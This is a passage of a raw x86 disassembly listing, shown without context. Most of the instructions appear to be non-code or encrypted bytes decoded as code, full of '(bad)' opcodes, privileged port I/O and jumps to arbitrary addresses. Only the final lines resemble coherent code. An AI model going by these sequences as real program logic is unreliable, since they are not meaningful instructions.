  4112ad:	and    BYTE PTR [eax+0x27],ch
  4112b0:	mov    bl,0x99
  4112b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112b3:	repz imul ebx,DWORD PTR [eax+edi*2-0x14c452c4],0xffffff94
  4112bc:	pop    es
  4112bd:	and    dh,bh
  4112bf:	mov    ebx,0x4f2d1cf5
  4112c4:	in     al,0x33
  4112c6:	les    edx,FWORD PTR [esi-0x43bcdde1]
  4112cc:	ds jno 0x4112b0
  4112cf:	pusha  
  4112d0:	adc    edi,DWORD PTR [edx+0x69]
  4112d3:	jns    0x411309
  4112d5:	add    eax,0x6cf00a2f
  4112da:	fnsave [eax+0x5f]
  4112dd:	ficom  DWORD PTR [ebx]
  4112df:	sbb    BYTE PTR [ebp+0x4f],bh
  4112e2:	jp     0x4112f3
  4112e4:	cmovge ebp,eax
  4112e7:	mov    cl,0xbe
  4112e9:	jo     0x411344
  4112eb:	ja     0x4112f5
  4112ed:	lea    ebp,[edi]
  4112ef:	(bad)  [eax]
  4112f1:	mov    al,ds:0x37c030d3
  4112f6:	mov    al,ds:0x4b193b4c
  4112fb:	xor    al,0x8c
  4112fd:	in     al,0x5e
  4112ff:	test   al,0xfd
  411301:	test   al,0x88
  411303:	cwde   
  411304:	xchg   esp,eax
  411305:	sbb    BYTE PTR [ebx+eax*8+0x71],cl
  411309:	and    al,0x71
  41130b:	imul   ecx,DWORD PTR [edx+eiz*4-0x78],0xffffffb7
  411310:	sbb    al,BYTE PTR ds:0x75fff8fc
  411316:	and    edx,DWORD PTR [ebx-0x6d4fda9e]
  41131c:	hlt    
  41131d:	xor    bx,di
  411320:	mov    BYTE PTR [edx-0x6076dfc6],0xd5
  411327:	pop    es
  411328:	aas    
  411329:	sbb    al,0x2d
  41132b:	out    0x51,al
  41132d:	imul   ecx,edi,0xffffffdc
  411330:	shr    BYTE PTR [ebp+0x316b4276],0x61
  411337:	ficomp DWORD PTR [edx]
  411339:	xchg   ecx,eax
  41133a:	sbb    edx,eax
  41133c:	repz shr BYTE PTR [esp+ebx*4],1
  411340:	mov    edx,es
  411342:	push   esi
  411343:	repz inc esi
  411345:	pop    eax
  411346:	pusha  
  411347:	sub    edi,ebp
  411349:	cmp    al,0x33
  41134b:	jnp    0x4113c3
  41134d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41134e:	imul   ecx,DWORD PTR [ebp+esi*8-0x1d4cad67],0xffffff9b
  411356:	push   es
  411357:	mov    BYTE PTR [ebx],cl
  411359:	daa    
  41135a:	add    BYTE PTR [ebx],al
  41135c:	(bad)  
  41135e:	adc    al,0x1a
  411360:	stos   BYTE PTR es:[edi],al
  411361:	scas   al,BYTE PTR es:[edi]
  411362:	fdivr  DWORD PTR [ebx-0x29]
  411365:	or     dh,bh
  411367:	outs   dx,DWORD PTR ds:[esi]
  411368:	inc    esp
  411369:	sub    eax,0xd21f5261
  41136e:	aam    0x85
  411370:	xchg   edx,eax
  411371:	sbb    BYTE PTR [ebx-0x50366e27],bl
  411377:	sbb    al,0x37
  411379:	fsub   st,st(6)
  41137b:	jnp    0x4113ca
  41137d:	push   ebx
  41137e:	mov    esp,0x227d6c90
  411383:	shr    BYTE PTR [ebp+0x420fb5dc],cl
  411389:	fcomp  QWORD PTR [ebp+0x7f7600e4]
  41138f:	push   es
  411390:	aam    0x48
  411392:	test   DWORD PTR [edx-0x342c94e7],edi
  411398:	mov    esi,0x20a7e2d7
  41139d:	dec    ebp
  41139e:	test   DWORD PTR [esi+edi*8],0xcfd1c19f
  4113a5:	cs in  al,0x48
  4113a8:	in     eax,0x9a
  4113aa:	clc    
  4113ab:	mov    esp,cs
  4113ad:	aas    
  4113ae:	dec    ebp
  4113af:	stos   DWORD PTR es:[edi],eax
  4113b0:	pop    esp
  4113b1:	mov    ch,0x3d
  4113b3:	push   ebx
  4113b4:	sub    al,0xd
  4113b6:	ret    
  4113b7:	dec    ebx
  4113b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113b9:	sbb    ecx,DWORD PTR [edx-0x1d3c3a83]
  4113bf:	(bad)  
  4113c0:	(bad)  
  4113c1:	in     eax,dx
  4113c2:	mov    cl,BYTE PTR [ecx+eiz*1]
  4113c5:	ins    DWORD PTR es:[edi],dx
  4113c6:	jmp    0x656a879f
  4113cb:	xchg   esp,eax
  4113cc:	mov    al,0x2e
  4113ce:	mov    cl,0xde
  4113d0:	sbb    BYTE PTR [edi],dh
  4113d2:	mov    al,0xef
  4113d4:	mov    ecx,0x552341f9
  4113d9:	fwait
  4113da:	cld    
  4113db:	adc    eax,0xa9962ab6
  4113e0:	and    DWORD PTR [edx],esp
  4113e2:	aad    0xde
  4113e4:	sub    ebp,DWORD PTR [ebp-0x56]
  4113e7:	iret   
  4113e8:	cld    
  4113e9:	data16 mov ds:0xf8d4d088,al
  4113ef:	fild   QWORD PTR [edi]
  4113f1:	cmp    DWORD PTR [ebx+0x281ebb2d],ecx
  4113f7:	in     eax,dx
  4113f8:	dec    esi
  4113f9:	(bad)  
  4113fa:	lods   al,BYTE PTR ds:[esi]
  4113fb:	nop
  4113fc:	es jle 0x41141b
  4113ff:	out    0x6e,al
  411401:	sbb    al,0x2b
  411403:	mov    DWORD PTR [edi],ebp
  411405:	mov    dl,0x97
  411407:	push   ecx
  411408:	fs mov WORD PTR es:[ebp-0x73],ds
  41140d:	xchg   dh,dh
  41140f:	xchg   edi,eax
  411410:	call   0xce60:0x6fb64a94
  411417:	pushf  
  411418:	sahf   
  411419:	push   ecx
  41141a:	popf   
  41141b:	fstp   QWORD PTR [esi+0x283c0b17]
  411421:	add    dh,BYTE PTR [esi+eax*4+0x6f]
  411425:	and    al,0xd
  411427:	out    dx,eax
  411428:	loopne 0x4113e6
  41142a:	je     0x4113dc
  41142c:	leave  
  41142d:	cmp    eax,0x4809d3c2
  411432:	push   esp
  411433:	xchg   ecx,eax
  411434:	outs   dx,BYTE PTR ds:[esi]
  411435:	mov    eax,0xce9b1992
  41143a:	xchg   ebx,eax
  41143b:	ja     0x411415
  41143d:	mov    esp,0x95c4621d
  411442:	out    0x69,al
  411444:	hlt    
  411445:	inc    esi
  411446:	popf   
  411447:	rcl    BYTE PTR [esi-0x30327c85],cl
  41144d:	jp     0x411445
  41144f:	fs push eax
  411451:	mov    ds:0xf79d8d34,al
  411456:	mov    bh,0x1f
  411458:	out    0xd3,al
  41145a:	push   esp
  41145b:	cwde   
  41145c:	dec    ebx
  41145d:	pop    esp
  41145e:	jle    0x4113fe
  411460:	pushf  
  411461:	sbb    BYTE PTR [ecx+eiz*8-0x3f06b572],al
  411468:	(bad)  
  411469:	loopne 0x41143d
  41146b:	mov    ah,0x73
  41146d:	mov    ah,0x94
  41146f:	push   edi
  411470:	mov    esp,0x814d2dfe
  411475:	pop    ecx
  411476:	push   esi
  411477:	add    BYTE PTR fs:[edi+0x14],bh
  41147b:	inc    esi
  41147c:	fisttp QWORD PTR [ecx+0x50]
  41147f:	iret   
  411480:	mov    cl,0x8b
  411482:	stc    
  411483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411484:	sar    DWORD PTR [esi+0x7994c052],cl
  41148a:	jecxz  0x4114fb
  41148c:	in     al,0xae
  41148e:	jg     0x411499
  411490:	arpl   WORD PTR [ecx-0x10],bp
  411493:	repz jmp 0x6b4df8db
  411499:	and    DWORD PTR [ebp+0x6b06eac8],edx
  41149f:	push   0xffffffa3
  4114a1:	push   eax
  4114a2:	push   eax
  4114a3:	stos   DWORD PTR es:[edi],eax
  4114a4:	add    dl,0xf
  4114a7:	jmp    0xfb79d8e4
  4114ac:	and    eax,0x24c0da20
  4114b1:	popf   
  4114b2:	int    0x86
  4114b4:	mov    dl,0x59
  4114b6:	xchg   BYTE PTR ds:0x7fe3144,al
  4114bc:	fdivp  st(2),st
  4114be:	loopne 0x41153c
  4114c0:	or     dl,BYTE PTR ds:0xceab8131
  4114c6:	push   edx
  4114c7:	cmp    esp,edx
  4114c9:	sbb    ebx,ebx
  4114cb:	ss mov al,0xef
  4114ce:	call   0x75f25dc8
  4114d3:	cdq    
  4114d4:	mov    dl,0x2a
  4114d6:	cmp    ebp,edx
  4114d8:	push   cs
  4114d9:	stos   DWORD PTR es:[edi],eax
  4114da:	bound  edx,QWORD PTR [ebp+0x4fb71856]
  4114e0:	mov    ah,0xb
  4114e2:	push   0xffffffa3
  4114e4:	xchg   ecx,eax
  4114e5:	and    eax,0x65d5653
  4114ea:	retf   
  4114eb:	jae    0x41150c
  4114ed:	jmp    FWORD PTR [ebx+edx*1-0x29ad8ecc]
  4114f4:	mov    eax,0xd40c5256
  4114f9:	test   eax,0x11f5ad76
  4114fe:	pop    ebp
  4114ff:	pushf  
  411500:	add    al,0xeb
  411502:	mov    dl,0x2a
  411504:	pop    esi
  411505:	lds    esp,FWORD PTR [esp+edi*8]
  411508:	add    edi,ebp
  41150a:	ins    DWORD PTR es:[edi],dx
  41150b:	cmp    DWORD PTR [esi],edi
  41150d:	inc    esi
  41150e:	jmp    0x1ce0:0x7cf31407
  411515:	out    dx,eax
  411516:	pushf  
  411517:	cmc    
  411518:	(bad)  
  411519:	icebp  
  41151a:	inc    edi
  41151b:	pop    ss
  41151c:	pop    ds
  41151d:	jbe    0x4114b2
  41151f:	dec    ebp
  411520:	push   edx
  411521:	fst    DWORD PTR [eax]
  411523:	shr    BYTE PTR [edx],0x2d
  411526:	mov    edx,0x180c8f5
  41152b:	pop    es
  41152c:	cld    
  41152d:	int3   
  41152e:	dec    esp
  41152f:	std    
  411530:	leave  
  411531:	dec    DWORD PTR [esi+0x742b0d2d]
  411537:	leave  
  411538:	stos   BYTE PTR es:[edi],al
  411539:	nop
  41153a:	call   0x92d7:0xaf636fbb
  411541:	cdq    
  411542:	stos   BYTE PTR es:[edi],al
  411543:	cmp    al,al
  411545:	jo     0x4114cd
  411547:	pop    esi
  411548:	inc    ebp
  411549:	mov    ds:0x81efff36,eax
  41154e:	call   0x7f659f3e
  411553:	ins    BYTE PTR es:[edi],dx
  411554:	sub    DWORD PTR [esp+esi*1],esi
  411557:	xchg   edi,eax
  411558:	or     al,0xad
  41155a:	jb     0x4115b3
  41155c:	mov    BYTE PTR [eax-0xc84387],bh
  411562:	repnz sub esp,DWORD PTR [ebp-0x12]
  411566:	aad    0x76
  411568:	sbb    esp,DWORD PTR [ecx-0x4b]
  41156b:	icebp  
  41156c:	and    al,BYTE PTR [eax+ebx*2-0x391d6ccc]
  411573:	ins    BYTE PTR es:[edi],dx
  411574:	xlat   BYTE PTR ds:[ebx]
  411575:	sbb    eax,0xb672e1f4
  41157a:	loope  0x411540
  41157c:	call   0x2909:0x4ccc1a70
  411583:	sbb    BYTE PTR [edi+0x592c8cda],bl
  411589:	jecxz  0x41152b
  41158b:	or     eax,0xd57b049
  411590:	cmp    ecx,DWORD PTR es:[eax+0x5e]
  411594:	lods   al,BYTE PTR fs:[esi]
  411596:	sbb    edi,DWORD PTR [esi+0x39]
  411599:	adc    eax,0xed9c40df
  41159e:	leave  
  41159f:	push   0x18
  4115a1:	(bad)  
  4115a4:	mov    ecx,0xabbdb45e
  4115a9:	mov    bl,0x4c
  4115ab:	jle    0x41158b
  4115ad:	mov    ebp,0xf6c1000d
  4115b2:	sub    BYTE PTR [ebp+0x32],al
  4115b5:	aam    0xa4
  4115b7:	hlt    
  4115b8:	or     eax,edx
  4115ba:	cmp    bp,WORD PTR [ebx-0x4d107ea0]
  4115c1:	mov    bl,0xe3
  4115c3:	jns    0x4115de
  4115c5:	ud2    
  4115c7:	leave  
  4115c8:	dec    ebx
  4115c9:	push   ss
  4115ca:	in     al,dx
  4115cb:	jge    0x4115a8
  4115cd:	aas    
  4115ce:	retf   
  4115cf:	mov    bh,0xf0
  4115d1:	pop    ebx
  4115d2:	dec    esp
  4115d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115d5:	xor    edi,0x66
  4115d8:	inc    eax
  4115d9:	xor    BYTE PTR [edi-0x2c],0x3a
  4115dd:	mov    bh,0xe6
  4115df:	mov    esp,0xf28e26e6
  4115e4:	inc    esp
  4115e5:	mov    ecx,0x5931b8e1
  4115ea:	push   edi
  4115eb:	ds jnp 0x411660
  4115ee:	ja     0x41163e
  4115f0:	or     esi,DWORD PTR [ebp-0x5e]
  4115f3:	sti    
  4115f4:	sbb    al,0xe8
  4115f6:	popf   
  4115f7:	sbb    DWORD PTR [edx],ebp
  4115f9:	cmp    BYTE PTR [edi],0x46
  4115fc:	aam    0x64
  4115fe:	dec    esi
  4115ff:	jmp    0x411626
  411601:	(bad)  
  411602:	xor    esi,DWORD PTR [edi-0x6f]
  411605:	fbld   TBYTE PTR [esi]
  411607:	jmp    0xf921a3bd
  41160c:	popf   
  41160d:	sbb    dh,al
  41160f:	icebp  
  411610:	pop    es
  411611:	and    BYTE PTR [ebx+0x29],cl
  411614:	cmp    ch,dl
  411616:	or     al,0x3b
  411618:	adc    eax,0x9c71c6fe
  41161d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41161e:	fidivr WORD PTR [ebp+0x3d]
  411621:	add    eax,0x85862e3e
  411626:	ja     0x41169e
  411628:	stc    
  411629:	xchg   ebx,eax
  41162a:	mov    ecx,0x4971a1b8
  41162f:	dec    esp
  411631:	mov    esp,0x80fbe459
  411636:	push   ds
  411637:	iret   
  411638:	out    dx,al
  411639:	shr    BYTE PTR [ebp+0x15910d33],cl
  41163f:	je     0x41165f
  411641:	fimul  WORD PTR [esi+0x727f2112]
  411647:	push   ebx
  411648:	mov    WORD PTR [eax],ss
  41164a:	jne    0x4115f7
  41164c:	add    esp,0x66
  41164f:	(bad)  
  411650:	sbb    eax,0x12ea84eb
  411655:	jo     0x41161a
  411657:	dec    edi
  411658:	inc    ebp
  411659:	jbe    0x411685
  41165b:	lods   al,BYTE PTR ds:[esi]
  41165c:	in     eax,dx
  41165d:	add    al,0xb1
  41165f:	nop
  411660:	xor    BYTE PTR [eax+0x2f4d9a03],al
  411666:	rcl    BYTE PTR [eax+ebx*8+0x7654fac4],0x4e
  41166e:	lods   eax,DWORD PTR ds:[esi]
  41166f:	sub    BYTE PTR [eax],0xad
  411672:	inc    edi
  411673:	stos   DWORD PTR es:[edi],eax
  411674:	(bad)  
  411675:	pop    esp
  411676:	ins    BYTE PTR es:[edi],dx
  411677:	sbb    ah,dh
  411679:	xor    ecx,DWORD PTR [ecx+0x10]
  41167c:	mov    eax,ds:0xdf616914
  411681:	cmp    al,0x39
  411683:	ret    
  411684:	jae    0x4116a5
  411686:	jne    0x411615
  411688:	mov    edx,0xf7dbaf9a
  41168d:	push   es
  41168e:	psubw  mm2,QWORD PTR ds:0xb2648057
  411695:	push   ss
  411696:	mov    ds:0xa58743e,al
  41169b:	jo     0x411686
  41169d:	dec    edi
  41169e:	cmp    eax,0x261d16cf
  4116a3:	xlat   BYTE PTR ds:[ebx]
  4116a4:	xor    al,BYTE PTR ds:0x74816ff6
  4116aa:	nop
  4116ab:	cdq    
  4116ac:	mov    eax,ds:0x3d6ab18b
  4116b1:	jns    0x411662
  4116b3:	mov    ah,0xd4
  4116b5:	pop    esi
  4116b6:	mov    eax,ds:0x181c61da
  4116bb:	cmp    al,0x86
  4116bd:	push   0x60
  4116bf:	in     al,0x22
  4116c1:	sub    al,0xb0
  4116c3:	add    BYTE PTR [edx],bh
  4116c5:	push   edi
  4116c6:	outs   dx,DWORD PTR ds:[esi]
  4116c7:	sbb    al,0x0
  4116c9:	mov    esi,0x4d384202
  4116ce:	out    dx,eax
  4116cf:	lods   eax,DWORD PTR ds:[esi]
  4116d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116d1:	iret   
  4116d2:	dec    ebx
  4116d3:	out    dx,al
  4116d4:	inc    esi
  4116d5:	sbb    edi,0x6d
  4116d8:	jmp    0x4116a0
  4116da:	dec    esi
  4116db:	inc    esi
  4116dc:	push   es
  4116dd:	xlat   BYTE PTR ds:[ebx]
  4116de:	(bad)  
  4116df:	mov    BYTE PTR ds:[ecx],cl
  4116e2:	and    DWORD PTR [ecx],0xffffff95
  4116e5:	mov    cl,0xe2
  4116e7:	std    
  4116e8:	mov    eax,ds:0x3c2f889b
  4116ed:	cmp    eax,0x631e39e2
  4116f2:	jmp    0x184075f
  4116f7:	pop    es
  4116f8:	mov    al,0x38
  4116fa:	mov    esi,0xf23a4ed2
  4116ff:	mov    edx,0x133bc86a
  411704:	dec    eax
  411705:	xchg   ebp,eax
  411706:	out    0x69,eax
  411708:	sbb    esi,DWORD PTR [edx+0x63]
  41170b:	sbb    eax,0x24eb3ff7
  411710:	or     bl,BYTE PTR [ebp+0x6cfa9060]
  411716:	jmp    0x2b32:0x5b0324e2
  41171d:	push   ss
  41171e:	fdiv   DWORD PTR ds:0x7423d1a6
  411724:	mov    dl,0x93
  411726:	outs   dx,BYTE PTR ds:[esi]
  411727:	or     ebp,DWORD PTR [ebp+0x60]
  41172a:	in     eax,dx
  41172b:	outs   dx,DWORD PTR ds:[esi]
  41172c:	pop    eax
  41172d:	popf   
  41172e:	cmp    al,BYTE PTR [ebx]
  411730:	mov    ah,0x8e
  411732:	out    0xf9,eax
  411734:	ror    cl,cl
  411736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411737:	or     eax,0xfcd0a25e
  41173c:	cdq    
  41173d:	or     edx,DWORD PTR [ebp+0x220d9068]
  411743:	or     bh,bh
  411745:	pop    esi
  411746:	mov    esi,0xc22640fe
  41174b:	repnz push ebp
  41174d:	sub    DWORD PTR [edi-0x34],edx
  411750:	int3   
  411751:	std    
  411752:	sub    esi,esp
  411754:	mov    dl,0x76
  411756:	add    esi,ebp
  411758:	cs (bad) 
  41175a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41175b:	sub    BYTE PTR [edi+0x72d4492d],0x18
  411762:	adc    al,0x87
  411764:	push   es
  411765:	cwde   
  411766:	addr16 xchg ebp,eax
  411768:	xor    BYTE PTR [eax],bh
  41176a:	xchg   esp,eax
  41176b:	cmp    al,bl
  41176d:	or     al,al
  41176f:	pushf  
  411770:	dec    eax
  411771:	add    bh,BYTE PTR [ebp+edi*4-0x36880b82]
  411778:	sbb    eax,0x11d3fa7b
  41177d:	mov    BYTE PTR [esi+0x3833a2bc],cl
  411783:	xchg   ebx,eax
  411784:	stos   DWORD PTR es:[edi],eax
  411785:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411786:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411787:	sti    
  411788:	add    BYTE PTR [edi+0xe34024f],bh
  41178e:	lods   eax,DWORD PTR ds:[esi]
  41178f:	stos   DWORD PTR es:[edi],eax
  411790:	add    al,0x95
  411792:	mov    ds:0x9653a577,al
  411797:	adc    edi,eax
  411799:	push   edx
  41179a:	mov    ah,0x3
  41179c:	shr    DWORD PTR [edx-0x18de0154],0x1c
  4117a3:	aas    
  4117a4:	xor    DWORD PTR [edx-0x58],ebp
  4117a7:	fidivr WORD PTR [ecx-0x142120f2]
  4117ad:	jmp    0xd77af930
  4117b2:	dec    esp
  4117b3:	jno    0x411825
  4117b5:	inc    ebp
  4117b6:	arpl   WORD PTR [eax],dx
  4117b8:	mov    al,0x67
  4117ba:	lods   al,BYTE PTR ds:[esi]
  4117bb:	pop    ds
  4117bc:	in     al,0x41
  4117be:	leave  
  4117bf:	bnd jl 0x4117f2
  4117c2:	mov    al,0x2e
  4117c4:	add    DWORD PTR [esi-0x7a],eax
  4117c7:	xchg   ebp,eax
  4117c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117c9:	inc    edi
  4117ca:	cmp    ebp,ebx
  4117cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117cd:	xchg   ebx,eax
  4117ce:	and    eax,ebx
  4117d0:	xor    al,0x35
  4117d2:	xchg   ebp,eax
  4117d3:	lock jmp 0x4b9:0x9adee885
  4117db:	dec    esi
  4117dc:	(bad)  
  4117dd:	jo     0x41177d
  4117df:	cmp    DWORD PTR [ebx+0x60],ebp
  4117e2:	jbe    0x4117e6
  4117e4:	cmc    
  4117e5:	jns    0x4117d9
  4117e7:	mov    edx,DWORD PTR [eax+0x40]
  4117ea:	std    
  4117eb:	(bad)  
  4117ec:	or     eax,0x7b99b6bb
  4117f1:	frstor [esi+0xcea9ea6]
  4117f7:	pushf  
  4117f8:	fbld   TBYTE PTR [edi-0x10b339c9]
  4117fe:	xor    al,0x1a
  411800:	ficomp WORD PTR [esi+0x2b]
  411803:	call   0xaf5a7a7e
  411808:	add    al,0x8f
  41180a:	arpl   WORD PTR [eax],dx
  41180c:	mov    eax,ds:0x59b17964
  411811:	xor    DWORD PTR [edx-0x6c],edx
  411814:	mov    cl,0xb4
  411816:	into   
  411817:	mov    edx,0xad4cb433
  41181c:	cmp    eax,0xa183dd5b
  411821:	add    BYTE PTR [eax+0x71fbc483],al
  411827:	push   0xea417c91
  41182c:	je     0x411817
  41182e:	or     eax,0x31d1e232
  411833:	pop    ebp
  411834:	pop    ebx
  411835:	push   ecx
  411836:	sub    DWORD PTR [ebx+0x3b],0xffffff90
  41183a:	daa    
  41183b:	mov    edi,DWORD PTR [ebx+ebp*1]
  41183e:	aaa    
  41183f:	or     ch,BYTE PTR [edi-0x47ab8838]
  411845:	leave  
  411846:	pop    edx
  411847:	loop   0x411811
  411849:	rcr    DWORD PTR [esi+0x3e],1
  41184c:	retf   0x8444
  41184f:	pop    es
  411850:	stos   DWORD PTR es:[edi],eax
  411851:	(bad)
  411855:	fistp  DWORD PTR [ebp+0x6bc4d69e]
  41185b:	mul    BYTE PTR [ebx]
  41185d:	dec    bp
  41185f:	stc    
  411860:	mov    dl,0x47
  411862:	inc    ecx
  411863:	sbb    dl,BYTE PTR [eax+0x15]
  411866:	test   dl,dh
  411868:	pop    ebp
  41186a:	mov    bl,dl
  41186c:	aad    0x60
  41186e:	gs dec esi
  411870:	not    DWORD PTR [esi]
  411872:	outs   dx,BYTE PTR ds:[esi]
  411873:	adc    cl,bl
  411875:	mov    ebp,edi
  411877:	mov    esp,eax
  411879:	hlt    
  41187a:	adc    cl,BYTE PTR [esi+0xf]
  41187d:	and    ecx,esi
  41187f:	push   esp
  411880:	xor    DWORD PTR [ebx-0x9],ebp
  411883:	inc    ebp
  411884:	cmp    DWORD PTR [edi],esi
  411886:	mov    ds:0x8092fea2,eax
  41188b:	(bad)  
  41188c:	dec    esi
  41188d:	and    DWORD PTR [edx-0x45],0x77400f6a
  411894:	dec    eax
  411895:	lds    eax,FWORD PTR ds:0x7baea2d8
  41189b:	ins    BYTE PTR es:[edi],dx
  41189c:	inc    eax
  41189d:	clc    
  41189e:	mov    ss,ecx
  4118a0:	int    0x2a
  4118a2:	jp     0x411886
  4118a4:	pop    esi
  4118a5:	jp     0x411908
  4118a7:	or     dl,BYTE PTR [eax]
  4118a9:	mov    esi,0xd987c935
  4118ae:	dec    ecx
  4118af:	mov    esi,DWORD PTR ds:0x18f192e1
  4118b5:	lods   eax,DWORD PTR ds:[esi]
  4118b6:	test   DWORD PTR [ecx+0x7e],edi
  4118b9:	fist   WORD PTR [esi-0x47]
  4118bc:	loop   0x41185b
  4118be:	into   
  4118bf:	jmp    0xb1f777e0
  4118c4:	mov    DWORD PTR [edi-0x59],esi
  4118c7:	jb     0x411893
  4118c9:	pop    edx
  4118ca:	cmp    eax,0xc6910573
  4118cf:	mul    ebx
  4118d1:	inc    ebp
  4118d2:	(bad)  [bx]
  4118d5:	aas    
  4118d6:	repnz pusha 
  4118d8:	sub    DWORD PTR [ebx],0x6b
  4118db:	adc    ebx,ebx
  4118dd:	inc    eax
  4118de:	jmp    0x6514b0da
  4118e3:	adc    eax,0xd160c8c8
  4118e8:	or     dh,BYTE PTR [edi+0x7a]
  4118eb:	pop    ebp
  4118ec:	ds and eax,esp
  4118ef:	cld    
  4118f0:	mov    edx,0xc8c21393
  4118f5:	in     eax,dx
  4118f6:	out    dx,eax
  4118f7:	scas   eax,DWORD PTR es:[edi]
  4118f8:	je     0x4118c0
  4118fa:	sbb    DWORD PTR [ecx],edi
  4118fc:	mov    edx,0x1e24e332
  411901:	in     eax,dx
  411902:	cld    
  411903:	inc    ebp
  411904:	rcr    DWORD PTR [eax],0x25
  411907:	inc    edi
  411908:	or     eax,0x5a43baf3
  41190d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41190e:	imul   ebp,eax,0x14
  411911:	icebp  
  411912:	popf   
  411913:	popf   
  411914:	push   ds
  411915:	sub    BYTE PTR [ebp+0x504b3cdb],0xb6
  41191c:	sub    BYTE PTR [esi-0x3d],ch
  41191f:	repnz fwait
  411921:	test   DWORD PTR [eax+edi*2],esi
  411924:	aad    0xf9
  411926:	pop    es
  411927:	gs enter 0x2ee8,0xef
  41192c:	js     0x4118cf
  41192e:	popa   
  41192f:	mov    DWORD PTR [ebx+0x75d30b57],esp
  411935:	xchg   edi,eax
  411936:	out    dx,eax
  411937:	jg     0x4119a1
  411939:	or     al,0xb5
  41193b:	sbb    eax,0x4d10485a
  411940:	dec    ebx
  411941:	push   esp
  411942:	lods   eax,DWORD PTR ds:[esi]
  411943:	push   esp
  411944:	out    0x42,eax
  411946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411948:	leave  
  411949:	push   edx
  41194a:	adc    BYTE PTR [ebp+0x6145a378],al
  411950:	jnp    0x41199d
  411952:	in     al,0xd3
  411954:	xchg   esi,eax
  411955:	jnp    0x4118f0
  411957:	icebp  
  411958:	sub    DWORD PTR [eax],eax
  41195a:	aaa    
  41195b:	jno    0x411955
  41195d:	cs sub al,0x3d
  411960:	das    
  411961:	mov    bl,0xa5
  411963:	xlat   BYTE PTR ds:[ebx]
  411964:	adc    DWORD PTR [edi+0x1d5e9cb7],ecx
  41196a:	jo     0x411984
  41196c:	js     0x411926
  41196e:	rol    ah,cl
  411970:	aad    0x5f
  411972:	in     al,dx
  411973:	(bad)  [edi+0x49]
  411976:	mov    dl,0xb9
  411978:	pusha  
  411979:	test   BYTE PTR [esp+edi*1+0x1b],0x8c
  41197e:	and    ebp,ebx
  411980:	push   cs
  411981:	push   ss
  411982:	shl    DWORD PTR [ecx-0x13],cl
  411985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411986:	adc    BYTE PTR [ebp+0x11],dh
  411989:	ret    
  41198a:	aas    
  41198b:	adc    bl,BYTE PTR [ebp+0x44]
  41198e:	mov    eax,0x4d434f91
  411993:	cmp    al,0x54
  411995:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411996:	adc    edx,edi
  411998:	int3   
  411999:	or     al,cl
  41199b:	aaa    
  41199c:	push   ds
  41199d:	inc    ebx
  41199e:	arpl   WORD PTR [eax+0x12],ax
  4119a1:	inc    ebp
  4119a2:	pop    ebx
  4119a3:	sbb    al,0x39
  4119a5:	in     al,0x98
  4119a7:	aam    0xfd
  4119a9:	jmp    0x618b6d26
  4119ae:	add    DWORD PTR [edi+0x70],ebp
  4119b1:	pop    esp
  4119b2:	int3   
  4119b3:	xlat   BYTE PTR ds:[ebx]
  4119b4:	out    0x6e,al
  4119b6:	push   cs
  4119b7:	xchg   DWORD PTR [esi],ebp
  4119b9:	fwait
  4119ba:	add    al,0xaa
  4119bc:	mov    dl,BYTE PTR [edi+0x15e124e2]
  4119c2:	mov    ebx,0xe54312dd
  4119c7:	iret   
  4119c8:	shl    DWORD PTR [esi+0x6e],0x69
  4119cc:	ins    BYTE PTR es:[edi],dx
  4119cd:	repz aaa 
  4119cf:	stos   BYTE PTR es:[edi],al
  4119d0:	and    ebp,DWORD PTR ds:0x4b694434
  4119d6:	aas    
  4119d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119d8:	fild   WORD PTR [esi]
  4119da:	push   edx
  4119db:	das    
  4119dc:	(bad)  
  4119dd:	shl    DWORD PTR [esi],cl
  4119df:	push   ss
  4119e0:	stos   BYTE PTR es:[edi],al
  4119e1:	mov    ebx,0xdb49e5fa
  4119e6:	aaa    
  4119e7:	xor    eax,0xdf83a090
  4119ec:	test   eax,0x204e66c7
  4119f1:	xchg   ecx,eax
  4119f2:	adc    edx,esp
  4119f4:	fdivr  QWORD PTR ds:0xdbec3723
  4119fa:	pop    edi
  4119fb:	test   eax,0x8e3b5507
  411a00:	aam    0x1b
  411a02:	mov    ebp,0xcb9d7a87
  411a07:	(bad)  
  411a09:	popa   
  411a0a:	jbe    0x411a23
  411a0c:	cmp    esp,DWORD PTR [ebp+0x63]
  411a0f:	inc    ecx
  411a10:	sahf   
  411a11:	mov    esi,0x78c23b47
  411a16:	addr16 out 0xd8,al
  411a19:	dec    ebx
  411a1a:	push   cs
  411a1b:	xor    al,0xb0
  411a1d:	mov    bl,0xc3
  411a1f:	mov    ebx,0x1ce43320
  411a24:	aas    
  411a25:	jp     0x4119be
  411a27:	ja     0x4119e9
  411a29:	loope  0x4119e4
  411a2b:	xchg   esp,eax
  411a2c:	mov    al,BYTE PTR [eax]
  411a2e:	add    BYTE PTR [esi+0x33],ah
  411a31:	dec    esp
  411a32:	xchg   edi,eax
  411a33:	add    al,BYTE PTR [ecx+0x42867b25]
  411a39:	add    BYTE PTR [eax],al
  411a3b:	add    BYTE PTR [eax],al
  411a3d:	add    cl,ch
  411a3f:	or     eax,0x8b000000
  411a44:	cmp    eax,0x42867b
  411a49:	inc    edi
  411a4a:	mov    DWORD PTR ds:0x42867b,edi
  411a50:	cmp    DWORD PTR ds:0x42867b,0x1d
